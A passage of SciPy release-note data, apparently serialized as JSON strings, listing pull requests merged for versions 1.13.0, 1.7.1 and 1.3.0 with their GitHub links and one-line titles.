<https://github.com/scipy/scipy/pull/19856>`__: BLD: simplify pythran version requirement in meson\n* `19857 <https://github.com/scipy/scipy/pull/19857>`__: BLD: make scipy build warning-free with LTO enabled\n* `19860 <https://github.com/scipy/scipy/pull/19860>`__: MAINT: fix BLD label typo\n* `19861 <https://github.com/scipy/scipy/pull/19861>`__: BUG:io:Skip arr_to_chars call for single code points\n* `19864 <https://github.com/scipy/scipy/pull/19864>`__: Add documentation to explain behavior for transposing csr or...\n* `19866 <https://github.com/scipy/scipy/pull/19866>`__: DOC: Change default for bounds in scipy.optimize.linprog\n* `19868 <https://github.com/scipy/scipy/pull/19868>`__: MAINT: fix use of \\`unique(..., return_inverse=True)\\`\n* `19869 <https://github.com/scipy/scipy/pull/19869>`__: MAINT: array types: rename \\`as_xparray\\` to \\`_asarray\\`\n* `19870 <https://github.com/scipy/scipy/pull/19870>`__: MAINT: logsumexp: properly handle complex sign\n* `19871 <https://github.com/scipy/scipy/pull/19871>`__: MAINT: make isinstance check in \\`stats._distn_infrastructure\\`...\n* `19874 <https://github.com/scipy/scipy/pull/19874>`__: rankdata: ensure correct shape for empty inputs\n* `19876 <https://github.com/scipy/scipy/pull/19876>`__: MAINT: stats: Add tests to ensure consistency between \\`wasserstein_distance\\` and different backends of \\`wasserstein_distance_nd\\`\n* `19880 <https://github.com/scipy/scipy/pull/19880>`__: DOC: prepare 1.13.0 release notes\n* `19882 <https://github.com/scipy/scipy/pull/19882>`__: MAINT: vendor \\`pocketfft\\` as git submodule\n* `19885 <https://github.com/scipy/scipy/pull/19885>`__: MAINT: fix some small array API support issues\n* `19886 <https://github.com/scipy/scipy/pull/19886>`__: TST: stats: fix a few issues with non-reproducible seeding\n* `19891 <https://github.com/scipy/scipy/pull/19891>`__: MAINT: stats: fix editable install issue in \\`qmc\\` and MPL-related...\n* `19893 <https://github.com/scipy/scipy/pull/19893>`__: MAINT: remove unused itertools-import in scipy.interpolate._interpolate\n* `19901 <https://github.com/scipy/scipy/pull/19901>`__: MAINT: special: remove use of \\`numpy.math\\` from \\`_cdflib.pyx\\`\n* `19902 <https://github.com/scipy/scipy/pull/19902>`__: BUG:special:cdflib: Correct cdftnc Cython bugs\n* `19908 <https://github.com/scipy/scipy/pull/19908>`__: Fix AIX build break.\n* `19909 <https://github.com/scipy/scipy/pull/19909>`__: MAINT:linalg:Adjust lwork/liwork changes OpenBLAS 0.3.26\n* `19916 <https://github.com/scipy/scipy/pull/19916>`__: MAINT: update pocketfft git submodule location\n* `19917 <https://github.com/scipy/scipy/pull/19917>`__: MAINT: replicate FITPACK's \\`fpchec\\` routine in python\n* `19924 <https://github.com/scipy/scipy/pull/19924>`__: TST: cluster: fix test_kmeans_and_kmeans2_random_seed\n* `19925 <https://github.com/scipy/scipy/pull/19925>`__: MAINT: forward port 1.12.0 relnotes\n* `19927 <https://github.com/scipy/scipy/pull/19927>`__: BUG: cluster.kmeans\\*: array types: accept \\`int\\`s for k\n* `19929 <https://github.com/scipy/scipy/pull/19929>`__: DOC: updated incorrect sentence about subpackage imports. See...\n* `19931 <https://github.com/scipy/scipy/pull/19931>`__: MAINT:special:cdflib:Refine the tolerances further\n* `19932 <https://github.com/scipy/scipy/pull/19932>`__: ENH:stats:Use explicit formula for gamma.fit('mm')\n* `19933 <https://github.com/scipy/scipy/pull/19933>`__: BUG: Correct handling of -inf in special stdr funcs\n* `19934 <https://github.com/scipy/scipy/pull/19934>`__: BUG:special:amos: Fix some mistakes in the AMOS C translation\n* `19937 <https://github.com/scipy/scipy/pull/19937>`__: TST: Add RNG seeds for TestInvgauss and TestLaplace\n* `19938 <https://github.com/scipy/scipy/pull/19938>`__: MAINT: special: array types: fix warning when not in array API...\n* `19939 <https://github.com/scipy/scipy/pull/19939>`__: BUG:special:amos: Fix exit path in \\`amos_asyi\\`\n* `19942 <https://github.com/scipy/scipy/pull/19942>`__: MAINT: hypothesis: document minimum required version\n* `19944 <https://github.com/scipy/scipy/pull/19944>`__: BUG: Correct handling of inf support in binomial\n* `19945 <https://github.com/scipy/scipy/pull/19945>`__: BLD: fix issue with escape sequences in \\`__config__.py\\`\n* `19947 <https://github.com/scipy/scipy/pull/19947>`__: BUG:special:amos: Fix typo in \\`amos_mlri\\`\n* `19950 <https://github.com/scipy/scipy/pull/19950>`__: DOC: stats.logrank: fix typo that affect survival curves in manual\n* `19952 <https://github.com/scipy/scipy/pull/19952>`__: BUG:sparse:Add early exit to gmres when x0 already solves problem\n* `19957 <https://github.com/scipy/scipy/pull/19957>`__: defect: sparse: 1d bool mask with wrong shape should raise IndexError\n* `19961 <https://github.com/scipy/scipy/pull/19961>`__: DOC: Add version warning banner to documentation\n* `19962 <https://github.com/scipy/scipy/pull/19962>`__: ENH: sparse: speedup csr/csc setdiag by converting to coo\n* `19965 <https://github.com/scipy/scipy/pull/19965>`__: DOC: scale of parameters in optimize.curve_fit\n* `19969 <https://github.com/scipy/scipy/pull/19969>`__: DOC: Fix landing page images for dark theme\n* `19971 <https://github.com/scipy/scipy/pull/19971>`__: ENH: Input validation for sampling frequency in signal.filter...\n* `19975 <https://github.com/scipy/scipy/pull/19975>`__: ENH: support custom statistic in goodness_of_fit function (gh-19894)\n* `19977 <https://github.com/scipy/scipy/pull/19977>`__: DOC: document a common alternative parameterization of invgauss.\n* `19978 <https://github.com/scipy/scipy/pull/19978>`__: DOC: fix autosummary for scipy.signal.ShortTimeFFT.t/T under...\n* `19980 <https://github.com/scipy/scipy/pull/19980>`__: ENH: stats: add axis/nan_policy support to \\`f_oneway\\` and \\`alexandergovern\\`\n* `19981 <https://github.com/scipy/scipy/pull/19981>`__: TST: correct typo in TestGamma.test_fit_mm function.\n* `19995 <https://github.com/scipy/scipy/pull/19995>`__: TST, MAINT: test_immediate_updating fix\n* `19997 <https://github.com/scipy/scipy/pull/19997>`__: MAINT: Adjust the codebase to the new \\`np.array\\`'s \\`copy\\`...\n* `20000 <https://github.com/scipy/scipy/pull/20000>`__: MAINT: interpolate: address review comments on NdBSpline/RGI\n* `20003 <https://github.com/scipy/scipy/pull/20003>`__: MAINT: sparse: change coo_matrix.indices to coo_matrix.coords\n* `20004 <https://github.com/scipy/scipy/pull/20004>`__: MAINT: sparse: change method names _mul_\\* to _matmul_\\* all...\n* `20005 <https://github.com/scipy/scipy/pull/20005>`__: MAINT: Remove partial from \\`__all__\\` (removed from submodule)\n* `20006 <https://github.com/scipy/scipy/pull/20006>`__: BENCH: optimize: add timings to global optimizers benchmarks\n* `20010 <https://github.com/scipy/scipy/pull/20010>`__: BUG: Add proper error message for \\`ShortTimeFFT\\` for onesided...\n* `20013 <https://github.com/scipy/scipy/pull/20013>`__: MAINT: signal: use \\`sliding_window_view\\` instead of \\`as_strided\\`\n* `20016 <https://github.com/scipy/scipy/pull/20016>`__: DOC: update release docs to reflect new version banner\n* `20017 <https://github.com/scipy/scipy/pull/20017>`__: BUG: loglaplace moment should be non-negative.\n* `20018 <https://github.com/scipy/scipy/pull/20018>`__: ENH: refer to the Laplace distribution in log-Laplace documentation.\n* `20019 <https://github.com/scipy/scipy/pull/20019>`__: DOC: Add support for interactive examples with jupyterlite-sphinx\n* `20020 <https://github.com/scipy/scipy/pull/20020>`__: TST: TestCorrelateReal overflow shim\n* `20021 <https://github.com/scipy/scipy/pull/20021>`__: ENH: fix numerical instability around zero in boxcox_llf\n* `20023 <https://github.com/scipy/scipy/pull/20023>`__: ENH: use analytic formula for log-laplace MLE when loc is known.\n* `20024 <https://github.com/scipy/scipy/pull/20024>`__: ENH:stats: Add multivariate Wasserstein distance as a separate...\n* `20032 <https://github.com/scipy/scipy/pull/20032>`__: MAINT: Adjust some comments in special C++ library\n* `20033 <https://github.com/scipy/scipy/pull/20033>`__: MAINT: sparse: Un-deprecate getnnz()\n* `20037 <https://github.com/scipy/scipy/pull/20037>`__: MAINT: Add special handling for complex infinite input in digamma\n* `20039 <https://github.com/scipy/scipy/pull/20039>`__: ENH: use analytical formula in scipy.stats.powerlaw._munp().\n* `20044 <https://github.com/scipy/scipy/pull/20044>`__: TST: _ConstraintWrapper returns a violation of the correct shape\n* `20045 <https://github.com/scipy/scipy/pull/20045>`__: DOC: add missing np. in tutorial\n* `20047 <https://github.com/scipy/scipy/pull/20047>`__: TST: use assert_allclose in test_bootstrap_alternative\n* `20052 <https://github.com/scipy/scipy/pull/20052>`__: FIX: Allow any dtype-specifier for ndimage output\n* `20053 <https://github.com/scipy/scipy/pull/20053>`__: Add sorting requirement for partial_match and partial_guess\n* `20054 <https://github.com/scipy/scipy/pull/20054>`__: BUG: SciPy.interpolate.CubicSpline with periodic data\n* `20063 <https://github.com/scipy/scipy/pull/20063>`__: ENH: optimize._differentiate: add option preserve_shape\n* `20065 <https://github.com/scipy/scipy/pull/20065>`__: MAINT Fix broken link in \\`scipy.stats._multivariate.py\\`\n* `20067 <https://github.com/scipy/scipy/pull/20067>`__: TST: shims for NumPy fft changes\n* `20068 <https://github.com/scipy/scipy/pull/20068>`__: Changed assert_warns in stats testing to pytest.warns.\n* `20069 <https://github.com/scipy/scipy/pull/20069>`__: MAINT/DOC: \\`special.nrdtrimn/nrdtrisd\\` docstring fixes\n* `20070 <https://github.com/scipy/scipy/pull/20070>`__: MAINT: silence ruff deprecation warning\n* `20076 <https://github.com/scipy/scipy/pull/20076>`__: BUG:linalg:Add early exit to eigh_tridiagonal for 1x1 input\n* `20078 <https://github.com/scipy/scipy/pull/20078>`__: CI: update github actions and cibuildwheel\n* `20080 <https://github.com/scipy/scipy/pull/20080>`__: BUG: sparse: Fix hstack, etc for dok_array\n* `20086 <https://github.com/scipy/scipy/pull/20086>`__: MAINT: detect musl differently.\n* `20087 <https://github.com/scipy/scipy/pull/20087>`__: MAINT: switch from \\`numpy.array_api\\` to \\`array-api-strict\\`\n* `20092 <https://github.com/scipy/scipy/pull/20092>`__: DOC: Fix a could of places that are parsed as substitution references...\n* `20093 <https://github.com/scipy/scipy/pull/20093>`__: DOC: Fix small typos in \\`signal.rst\\` and \\`_short_time_fft.py\\`\n* `20095 <https://github.com/scipy/scipy/pull/20095>`__: DOC: tick tensor product splines off the roadmap\n* `20096 <https://github.com/scipy/scipy/pull/20096>`__: TST:linalg:Reduce the size of the cossin test\n* `20098 <https://github.com/scipy/scipy/pull/20098>`__: MAINT: minor array API skip improvements\n* `20101 <https://github.com/scipy/scipy/pull/20101>`__: MAINT: editorial changes in the doc string of scipy.stats.vonmises.\n* `20102 <https://github.com/scipy/scipy/pull/20102>`__: ENH: use non-trivial bounds to solve for kappa of vonmises MLE.\n* `20103 <https://github.com/scipy/scipy/pull/20103>`__: MAINT: optimize: expose \\`NoConvergence\\`\n* `20104 <https://github.com/scipy/scipy/pull/20104>`__: ENH: allow shape parameter kappa to be zero in vonmises distribution.\n* `20106 <https://github.com/scipy/scipy/pull/20106>`__: DOC: update docstring of stats.percentileofscore\n* `20108 <https://github.com/scipy/scipy/pull/20108>`__: MAINT: shim for descr->f access\n* `20111 <https://github.com/scipy/scipy/pull/20111>`__: DOC: clarify accepted values for \\`dim\\` in \\`unitary_group\\`.\n* `20112 <https://github.com/scipy/scipy/pull/20112>`__: BLD: signal: do not install Pythran source alongside the Cython...\n* `20119 <https://github.com/scipy/scipy/pull/20119>`__: Fix small issues in docstrings\n* `20121 <https://github.com/scipy/scipy/pull/20121>`__: BLD: simplifications in meson.build files\n* `20122 <https://github.com/scipy/scipy/pull/20122>`__: MAINT: update Boost.Math to 1.83.0\n* `20123 <https://github.com/scipy/scipy/pull/20123>`__: MAINT: stats: fix test failure in \\`kendalltau_seasonal\\`\n* `20130 <https://github.com/scipy/scipy/pull/20130>`__: BUG: Use Cython implementation of complex hyp2f1 in orthogonal_eval.pxd\n* `20135 <https://github.com/scipy/scipy/pull/20135>`__: MAINT: interpolate: define \\`F_INT\\` as \\`int\\` rather than \\`npy_int32\\`\n* `20138 <https://github.com/scipy/scipy/pull/20138>`__: TST: optimize: silence the output from calling cobyla with disp=True\n* `20141 <https://github.com/scipy/scipy/pull/20141>`__: MAINT/CI: special/array types: test alternative backends in CI\n* `20143 <https://github.com/scipy/scipy/pull/20143>`__: DOC: stats: Fix typo in the doc of the Kstwobign distribution\n* `20144 <https://github.com/scipy/scipy/pull/20144>`__: MAINT, ENH: Hausdorff simplification\n* `20145 <https://github.com/scipy/scipy/pull/20145>`__: TST: special: bump tolerances for new \\`cdftnc\\` regression tests\n* `20146 <https://github.com/scipy/scipy/pull/20146>`__: MAINT: fix incorrect \\`noexcept\\` usage in Cython functions\n* `20149 <https://github.com/scipy/scipy/pull/20149>`__: BLD: Ensure Python.h is included before system headers.\n* `20153 <https://github.com/scipy/scipy/pull/20153>`__: BLD: interpolate: _interpnd_info does not need installing\n* `20154 <https://github.com/scipy/scipy/pull/20154>`__: ENH: sparse: implement fromkeys for _dok_base\n* `20163 <https://github.com/scipy/scipy/pull/20163>`__: MAINT: dev.py: allow --args after --\n* `20168 <https://github.com/scipy/scipy/pull/20168>`__: BUG: optimize: Fix constraint condition in inner loop of nnls\n* `20172 <https://github.com/scipy/scipy/pull/20172>`__: MAINT: (additional) array copy semantics shims\n* `20173 <https://github.com/scipy/scipy/pull/20173>`__: TST:special:Add partial tests for nrdtrimn and nrdtrisd\n* `20174 <https://github.com/scipy/scipy/pull/20174>`__: DOC: interpolate: \\`splrep\\` default boundary condition\n* `20175 <https://github.com/scipy/scipy/pull/20175>`__: MAINT: sparse: add missing dict methods to DOK and tests\n* `20176 <https://github.com/scipy/scipy/pull/20176>`__: MAINT: vulture/ruff fixups\n* `20181 <https://github.com/scipy/scipy/pull/20181>`__: MAINT: Avoid \\`descr->elsize\\` and use intp for it.\n* `20183 <https://github.com/scipy/scipy/pull/20183>`__: BUG: Fix fancy indexing on compressed sparse arrays with mixed...\n* `20184 <https://github.com/scipy/scipy/pull/20184>`__: DOC, DX: Remove version warning banner in latest version\n* `20186 <https://github.com/scipy/scipy/pull/20186>`__: MAINT: update action. Closes #20180\n* `20191 <https://github.com/scipy/scipy/pull/20191>`__: BUG: Fix shape of single Rotation raised to the 0 or 1 power\n* `20193 <https://github.com/scipy/scipy/pull/20193>`__: MAINT: Bump \\`npy2_compat.h\\` and add temporary pybind11 workaround\n* `20195 <https://github.com/scipy/scipy/pull/20195>`__: ENH: linalg: allow readonly arrays in expm et al\n* `20197 <https://github.com/scipy/scipy/pull/20197>`__: TST: linalg: fix complex sort in test_bad_geneig\n* `20198 <https://github.com/scipy/scipy/pull/20198>`__: BLD: update minimum Cython version to 3.0.8\n* `20203 <https://github.com/scipy/scipy/pull/20203>`__: TST: linalg: undo xfail TestEig::test_singular\n* `20204 <https://github.com/scipy/scipy/pull/20204>`__: TST: linalg: add a regression test for a gen eig problem\n* `20205 <https://github.com/scipy/scipy/pull/20205>`__: BUG: Fixed \\`fftshift()\\` in \\`ShortTimeFFT\\`.\n* `20206 <https://github.com/scipy/scipy/pull/20206>`__: DOC: clarify role of p in linalg.qr.\n* `20209 <https://github.com/scipy/scipy/pull/20209>`__: CI: move regular macosx_arm64 from cirrus to GHA\n* `20210 <https://github.com/scipy/scipy/pull/20210>`__: BLD: macosx_arm64 wheel build on GHA instead of cirrus\n* `20212 <https://github.com/scipy/scipy/pull/20212>`__: BUG: linalg/sqrtm: more robust check for real->complex Schur...\n* `20215 <https://github.com/scipy/scipy/pull/20215>`__: MAINT: bump OpenBLAS \"the old way\"\n* `20217 <https://github.com/scipy/scipy/pull/20217>`__: DOC/MAINT: add examples for nctdtridf, nctdtrinc, nctdtrit\n* `20218 <https://github.com/scipy/scipy/pull/20218>`__: TST: mark linalg.sqrtm test as xfail\n* `20221 <https://github.com/scipy/scipy/pull/20221>`__: TST: Tweak tols and ignore warnings for more reliable SVD tests\n* `20222 <https://github.com/scipy/scipy/pull/20222>`__: DOC add likelihood formula to stats.CensoredData\n* `20224 <https://github.com/scipy/scipy/pull/20224>`__: BUG: fix \\`cluster.vq.kmeans2\\` with minit='++' for 1D data\n* `20227 <https://github.com/scipy/scipy/pull/20227>`__: MAINT: remove repeated \"the\" typos\n* `20229 <https://github.com/scipy/scipy/pull/20229>`__: BUG: linalg: fix int overflow in Cholesky (potrf)\n* `20231 <https://github.com/scipy/scipy/pull/20231>`__: DOC/DX: array types: update \\`_asarray\\` description\n* `20232 <https://github.com/scipy/scipy/pull/20232>`__: BLD: Refactor BLAS/LAPACK wrapper infrastructure\n* `20233 <https://github.com/scipy/scipy/pull/20233>`__: DOC: stats.rv_continuous.fit: fix backslashes\n* `20235 <https://github.com/scipy/scipy/pull/20235>`__: DOC: add reference for ARGUS distribution in scipy.stats\n* `20236 <https://github.com/scipy/scipy/pull/20236>`__: DOC: fix small typo in array API docs\n* `20237 <https://github.com/scipy/scipy/pull/20237>`__: MAINT: optimize: update \\`_direct\\` for typos\n* `20238 <https://github.com/scipy/scipy/pull/20238>`__: MAINT: revert ARPACK changes from #20227\n* `20241 <https://github.com/scipy/scipy/pull/20241>`__: BLD: remove use of \\`NPY_VISIBILITY_HIDDEN\\`\n* `20243 <https://github.com/scipy/scipy/pull/20243>`__: MAINT: Specfun translation into C++\n* `20245 <https://github.com/scipy/scipy/pull/20245>`__: MAINT: Updated _specfun.pyx\n* `20248 <https://github.com/scipy/scipy/pull/20248>`__: MAINT: Removed specfun_lib and updated specfun_wrappers\n* `20250 <https://github.com/scipy/scipy/pull/20250>`__: MAINT: interpolate: const qualify cython arrays\n* `20251 <https://github.com/scipy/scipy/pull/20251>`__: MAINT:special:Adjust inf values for cdflib\n* `20254 <https://github.com/scipy/scipy/pull/20254>`__: MAINT: linalg: readability refactor Riccati equation solver tests\n* `20259 <https://github.com/scipy/scipy/pull/20259>`__: BUG: linalg: fix \\`expm\\` for large arrays\n* `20261 <https://github.com/scipy/scipy/pull/20261>`__: BUG:linalg:Remove the 2x2 branch in expm\n* `20263 <https://github.com/scipy/scipy/pull/20263>`__: DOC/REL: add missing expired deprecations to 1.12.0 notes\n* `20266 <https://github.com/scipy/scipy/pull/20266>`__: MAINT: stats.wilcoxon: pass \\`PermutationMethod\\` options to...\n* `20270 <https://github.com/scipy/scipy/pull/20270>`__: BLD: update dependencies for 1.13.0 release and numpy 2.0\n* `20279 <https://github.com/scipy/scipy/pull/20279>`__: MAINT: 1.13.0rc1 prep [wheel build]\n* `20290 <https://github.com/scipy/scipy/pull/20290>`__: REL: set 1.13.0rc2 unreleased\n* `20299 <https://github.com/scipy/scipy/pull/20299>`__: BUG: Optimize: NewtonCG min crashes with xtol=0\n* `20313 <https://github.com/scipy/scipy/pull/20313>`__: MAINT: bump pocketfft, MacOS patch\n* `20314 <https://github.com/scipy/scipy/pull/20314>`__: BUG: sparse: Restore random coordinate ordering to pre-1.12 results\n* `20318 <https://github.com/scipy/scipy/pull/20318>`__: BUG: signal: Fix scalar input issue of signal.lfilter\n* `20327 <https://github.com/scipy/scipy/pull/20327>`__: DOC: mention BSpline.insert_knot in the 1.13.0 release notes\n* `20333 <https://github.com/scipy/scipy/pull/20333>`__: BUG: sync pocketfft again\n* `20337 <https://github.com/scipy/scipy/pull/20337>`__: MAINT: spatial: use cython_lapack in spatial/_qhull.pyx\n* `20341 <https://github.com/scipy/scipy/pull/20341>`__: BUG: linalg: raise an error in dnrm2(..., incx<0)\n* `20345 <https://github.com/scipy/scipy/pull/20345>`__: BUG: nelder-mead fix degenerate simplex\n* `20347 <https://github.com/scipy/scipy/pull/20347>`__: BLD: require pybind11 >=2.12.0 for numpy 2.0 compatibility\n* `20349 <https://github.com/scipy/scipy/pull/20349>`__: Do not segfault in svd(a) with VT.size > INT_MAX\n* `20350 <https://github.com/scipy/scipy/pull/20350>`__: BUG: optimize: Fix wrong condition to check invalid optimization...\n* `20353 <https://github.com/scipy/scipy/pull/20353>`__: DOC: remove outdated NumPy imports note\n* `20359 <https://github.com/scipy/scipy/pull/20359>`__: ENH: Converting amos to std::complex\n* `20361 <https://github.com/scipy/scipy/pull/20361>`__: ENH: Rest of amos translation\n* `20362 <https://github.com/scipy/scipy/pull/20362>`__: MAINT, BUG: bump OpenBLAS\n* `20364 <https://github.com/scipy/scipy/pull/20364>`__: BUG: interpolate: Fix wrong warning message if degree=-1 in \\`interpolate.RBFInterpolator\\`\n* `20374 <https://github.com/scipy/scipy/pull/20374>`__: MAINT: update pybind11 and numpy build-time requirements for...\n\n\n==========================\n", "1.7.1": "-----------------------\n\n* `14178 <https://github.com/scipy/scipy/pull/14178>`__: DEV: Update Boschloo Exact test\n* `14264 <https://github.com/scipy/scipy/pull/14264>`__: REL: prepare for SciPy 1.7.1\n* `14283 <https://github.com/scipy/scipy/pull/14283>`__: BUG: fix refguide-check namedtuple handling\n* `14303 <https://github.com/scipy/scipy/pull/14303>`__: FIX: Check for None before calling str methods\n* `14327 <https://github.com/scipy/scipy/pull/14327>`__: BUG: medfilt can access beyond the end of an array\n* `14355 <https://github.com/scipy/scipy/pull/14355>`__: BUG: KDTree balanced_tree is unbalanced for degenerate data\n* `14368 <https://github.com/scipy/scipy/pull/14368>`__: BUG: avoid large cython global variable in function\n* `14384 <https://github.com/scipy/scipy/pull/14384>`__: BUG: Reference count leak in distance_pybind\n* `14397 <https://github.com/scipy/scipy/pull/14397>`__: DOC/CI: do not allow sphinx 4.1.\n* `14417 <https://github.com/scipy/scipy/pull/14417>`__: DOC/CI: pin sphinx to !=4.1.0\n* `14460 <https://github.com/scipy/scipy/pull/14460>`__: DOC: add required scipy version to kwarg\n* `14466 <https://github.com/scipy/scipy/pull/14466>`__: MAINT: 1.7.1 backports (round 1)\n* `14508 <https://github.com/scipy/scipy/pull/14508>`__: MAINT: bump scipy-mathjax\n* `14509 <https://github.com/scipy/scipy/pull/14509>`__: MAINT: 1.7.1 backports (round 2)\n\n\n\n==========================\n", "1.3.0": "-----------------------\n\n* `7827 <https://github.com/scipy/scipy/pull/7827>`__: ENH: sparse: overhaul of sparse matrix indexing\n* `8431 <https://github.com/scipy/scipy/pull/8431>`__: ENH: Cython optimize zeros api\n* `8743 <https://github.com/scipy/scipy/pull/8743>`__: DOC: Updated linalg.pinv, .pinv2, .pinvh docstrings\n* `8744 <https://github.com/scipy/scipy/pull/8744>`__: DOC: added examples to remez docstring\n* `9227 <https://github.com/scipy/scipy/pull/9227>`__: DOC: update description of \"direc\" parameter of \"fmin_powell\"\n* `9263 <https://github.com/scipy/scipy/pull/9263>`__: ENH: optimize: added \"revised simplex\" for scipy.optimize.linprog\n* `9325 <https://github.com/scipy/scipy/pull/9325>`__: DEP: Remove deprecated functions for 1.3.0\n* `9330 <https://github.com/scipy/scipy/pull/9330>`__: Add note on push and pull affine transformations\n* `9423 <https://github.com/scipy/scipy/pull/9423>`__: DOC: Clearly state how 2x2 input arrays are handled in stats.linregress\n* `9428 <https://github.com/scipy/scipy/pull/9428>`__: ENH: parallelised brute\n* `9438 <https://github.com/scipy/scipy/pull/9438>`__: BUG: Initialize coo matrix with size_t indexes\n* `9455 <https://github.com/scipy/scipy/pull/9455>`__: MAINT: Speed up get_(lapack,blas)_func\n* `9465 <https://github.com/scipy/scipy/pull/9465>`__: MAINT: Clean up optimize.zeros C solvers interfaces/code.\n* `9477 <https://github.com/scipy/scipy/pull/9477>`__: DOC: linalg: fix lstsq docstring on residues shape\n* `9478 <https://github.com/scipy/scipy/pull/9478>`__: DOC: Add docstring examples for rosen functions\n* `9479 <https://github.com/scipy/scipy/pull/9479>`__: DOC: Add docstring example for ai_zeros and bi_zeros\n* `9480 <https://github.com/scipy/scipy/pull/9480>`__: MAINT: linalg: lstsq clean up\n* `9489 <https://github.com/scipy/scipy/pull/9489>`__: DOC: roadmap update for changes over the last year.\n* `9492 <https://github.com/scipy/scipy/pull/9492>`__: MAINT: stats: Improve implementation of chi2 ppf method.\n* `9497 <https://github.com/scipy/scipy/pull/9497>`__: DOC: Improve docstrings sparse.linalg.isolve\n* `9499 <https://github.com/scipy/scipy/pull/9499>`__: DOC: Replace \"Scipy\" with \"SciPy\" in the .rst doc files for consistency.\n* `9500 <https://github.com/scipy/scipy/pull/9500>`__: DOC: Document the toolchain and its roadmap.\n* `9505 <https://github.com/scipy/scipy/pull/9505>`__: DOC: specify which definition of skewness is used\n* `9511 <https://github.com/scipy/scipy/pull/9511>`__: DEP: interpolate: remove deprecated interpolate_wrapper\n* `9517 <https://github.com/scipy/scipy/pull/9517>`__: BUG: improve error handling in stats.iqr\n* `9522 <https://github.com/scipy/scipy/pull/9522>`__: ENH: Add Fiedler and fiedler companion to special matrices\n* `9526 <https://github.com/scipy/scipy/pull/9526>`__: TST: relax precision requirements in signal.correlate tests\n* `9529 <https://github.com/scipy/scipy/pull/9529>`__: DOC: fix missing random seed in optimize.newton example\n* `9533 <https://github.com/scipy/scipy/pull/9533>`__: MAINT: Use list comprehension when possible\n* `9537 <https://github.com/scipy/scipy/pull/9537>`__: DOC: add a \"big picture\" roadmap\n* `9538 <https://github.com/scipy/scipy/pull/9538>`__: DOC: Replace \"Numpy\" with \"NumPy\" in .py, .rst and .txt doc files...\n* `9539 <https://github.com/scipy/scipy/pull/9539>`__: ENH: add two-sample test (Epps-Singleton) to scipy.stats\n* `9559 <https://github.com/scipy/scipy/pull/9559>`__: DOC: add section on global optimizers to tutorial\n* `9561 <https://github.com/scipy/scipy/pull/9561>`__: ENH: remove noprefix.h, change code appropriately\n* `9562 <https://github.com/scipy/scipy/pull/9562>`__: MAINT: stats: Rewrite pearsonr.\n* `9563 <https://github.com/scipy/scipy/pull/9563>`__: BUG: Minor bug fix Callback in linprog(method='simplex')\n* `9568 <https://github.com/scipy/scipy/pull/9568>`__: MAINT: raise runtime error for newton with zeroder if disp true,...\n* `9570 <https://github.com/scipy/scipy/pull/9570>`__: Correct docstring in show_options in optimize. Fixes #9407\n* `9573 <https://github.com/scipy/scipy/pull/9573>`__: BUG fixes range of pk variable pre-check\n* `9577 <https://github.com/scipy/scipy/pull/9577>`__: TST: fix minor issue in a signal.stft test.\n* `9580 <https://github.com/scipy/scipy/pull/9580>`__: Included blank line before list - Fixes #8658\n* `9582 <https://github.com/scipy/scipy/pull/9582>`__: MAINT: drop Python 2.7 and 3.4\n* `9588 <https://github.com/scipy/scipy/pull/9588>`__: MAINT: update \\`constants.astronomical_unit\\` to new 2012 value.\n* `9592 <https://github.com/scipy/scipy/pull/9592>`__: TST: Add 32-bit testing to CI\n* `9593 <https://github.com/scipy/scipy/pull/9593>`__: DOC: Replace cumulative density with cumulative distribution\n* `9596 <https://github.com/scipy/scipy/pull/9596>`__: TST: remove VC 9.0 from Azure CI\n* `9599 <https://github.com/scipy/scipy/pull/9599>`__: Hyperlink DOI to preferred resolver\n* `9601 <https://github.com/scipy/scipy/pull/9601>`__: DEV: try to limit GC memory use on PyPy\n* `9603 <https://github.com/scipy/scipy/pull/9603>`__: MAINT: improve logcdf and logsf of hypergeometric distribution\n* `9605 <https://github.com/scipy/scipy/pull/9605>`__: Reference to pylops in LinearOperator notes and ARPACK example\n* `9617 <https://github.com/scipy/scipy/pull/9617>`__: TST: reduce max memory usage for sparse.linalg.lgmres test\n* `9619 <https://github.com/scipy/scipy/pull/9619>`__: FIX: Sparse matrix addition/subtraction eliminates explicit zeros\n* `9621 <https://github.com/scipy/scipy/pull/9621>`__: bugfix in rv_sample in scipy.stats\n* `9622 <https://github.com/scipy/scipy/pull/9622>`__: MAINT: Raise error in directed_hausdorff distance\n* `9623 <https://github.com/scipy/scipy/pull/9623>`__: DOC: Build docs with warnings as errors\n* `9625 <https://github.com/scipy/scipy/pull/9625>`__: Return the number of calls to 'hessp' (not just 'hess') in trust...\n* `9627 <https://github.com/scipy/scipy/pull/9627>`__: BUG: ignore empty lines in mmio\n* `9637 <https://github.com/scipy/scipy/pull/9637>`__: Function to calculate the MAD of an array\n* `9646 <https://github.com/scipy/scipy/pull/9646>`__: BUG: stats: mode for objects w/ndim > 1\n* `9648 <https://github.com/scipy/scipy/pull/9648>`__: Add \\`stats.contingency\\` to refguide-check\n* `9650 <https://github.com/scipy/scipy/pull/9650>`__: ENH: many lobpcg() algorithm improvements\n* `9652 <https://github.com/scipy/scipy/pull/9652>`__: Move misc.doccer to _lib.doccer\n* `9660 <https://github.com/scipy/scipy/pull/9660>`__: ENH: add pearson, tippett, and mudholkar-george to combine_pvalues\n* `9661 <https://github.com/scipy/scipy/pull/9661>`__: BUG: Fix ksone right-hand endpoint, documentation and tests.\n* `9664 <https://github.com/scipy/scipy/pull/9664>`__: ENH: adding multi-target dijsktra performance enhancement\n* `9670 <https://github.com/scipy/scipy/pull/9670>`__: MAINT: link planck and geometric distribution in scipy.stats\n* `9676 <https://github.com/scipy/scipy/pull/9676>`__: ENH: optimize: change default linprog method to interior-point\n* `9685 <https://github.com/scipy/scipy/pull/9685>`__: Added reference to ndimage.filters.median_filter\n* `9705 <https://github.com/scipy/scipy/pull/9705>`__: Fix coefficients in expm helper function\n* `9711 <https://github.com/scipy/scipy/pull/9711>`__: Release the GIL during sosfilt processing for simple types\n* `9721 <https://github.com/scipy/scipy/pull/9721>`__: ENH: Convexhull visiblefacets\n* `9723 <https://github.com/scipy/scipy/pull/9723>`__: BLD: Modify rv_generic._construct_doc to print out failing distribution...\n* `9726 <https://github.com/scipy/scipy/pull/9726>`__: BUG: Fix small issues with \\`signal.lfilter'\n* `9729 <https://github.com/scipy/scipy/pull/9729>`__: BUG: Typecheck iterations for binary image operations\n* `9730 <https://github.com/scipy/scipy/pull/9730>`__: ENH: reduce sizeof(NI_WatershedElement) by 20%\n* `9731 <https://github.com/scipy/scipy/pull/9731>`__: ENH: remove suspicious sequence of type castings\n* `9739 <https://github.com/scipy/scipy/pull/9739>`__: BUG: qr_updates fails if u is exactly in span Q\n* `9749 